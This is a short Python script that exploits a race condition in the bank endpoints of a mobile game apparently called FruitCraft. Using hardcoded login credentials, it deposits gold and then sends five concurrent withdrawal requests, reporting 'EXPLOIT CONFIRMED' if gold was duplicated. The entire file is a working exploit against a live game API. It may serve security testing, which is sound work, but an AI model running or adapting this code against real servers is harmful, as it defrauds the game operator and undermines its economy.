import sys, os
import json
import time
import threading
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def withdraw(c):
    res = c.post("/player/withdrawfrombank", {"withdraw": 91})
    print(res.get("status") if res else "Fail", end=" ")

def main():
    print("Testing Concurrent Withdraws Exploit (Race Condition)...")
    c1 = FruitClient()
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    if not s1: return
    
    # clean bank
    c1.post("/player/withdrawfrombank", {"withdraw": 999999})
    time.sleep(1)

    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    start_gold = d1["data"].get("gold", 0)
    print("Starting Gold (Wallet):", start_gold)

    # Deposit 100 gold
    c1.post("/player/deposittobank", {"deposit": 100})
    time.sleep(1)
    
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    bank_bal = d1["data"].get("bank_account_balance", 0)
    new_gold = d1["data"].get("gold", 0)
    print(f"Bank after deposit: {bank_bal} | Wallet: {new_gold}")

    threads = []
    # Withdraw 91 concurrently
    for i in range(5):
        t = threading.Thread(target=withdraw, args=(c1,)) 
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()

    print()
    time.sleep(1)
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    final_bank = d1["data"].get("bank_account_balance", 0)
    final_gold = d1["data"].get("gold", 0)
    print(f"Final Bank: {final_bank} | Final Wallet: {final_gold}")
    
    if final_gold > start_gold:
        print(f"[!] EXPLOIT CONFIRMED: Duplicated {final_gold - start_gold} gold via race condition!")
    else:
        print("[-] Exploit failed to generate net positive gold.")

if __name__ == "__main__":
    main()
